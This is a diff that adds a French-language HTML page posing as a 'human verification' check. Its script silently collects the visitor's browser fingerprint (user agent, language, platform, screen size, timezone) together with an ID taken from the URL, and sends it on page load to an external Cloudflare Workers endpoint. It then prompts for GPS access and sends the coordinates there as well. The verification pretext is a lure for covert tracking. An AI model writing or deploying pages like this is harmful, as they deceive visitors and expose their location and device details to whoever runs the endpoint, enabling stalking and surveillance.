@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Je suis humain</title>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      margin-top: 50px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Verfication en cours 📲</h2>
+<p id="status">Veuillez patienter...</p>
+
+<script>
+// 🔴 METS ICI L'URL DE TON WORKER
+const ENDPOINT = "https://cold-field-7ab6.ekp2835.workers.dev";
+
+// 🔹 ID du tag
+const params = new URLSearchParams(window.location.search);
+const tagId = params.get("id") || "inconnu";
+
+// 🔹 Données collectées
+const baseData = {
+  tagId: tagId,
+  userAgent: navigator.userAgent,
+  language: navigator.language,
+  platform: navigator.platform,
+  screen: screen.width + "x" + screen.height,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  time: new Date().toISOString()
+};
+
+// 🔹 Fonction envoi
+function send(data) {
+  fetch(ENDPOINT, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
+}
+
+// 🔥 Envoi automatique
+send(baseData);
+
+// 🔹 GPS (avec popup)
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      send({
+        ...baseData,
+        location: {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude
+        }
+      });
+    },
+    () => {}
+  );
+}
+</script>
+
+</body>
+</html>
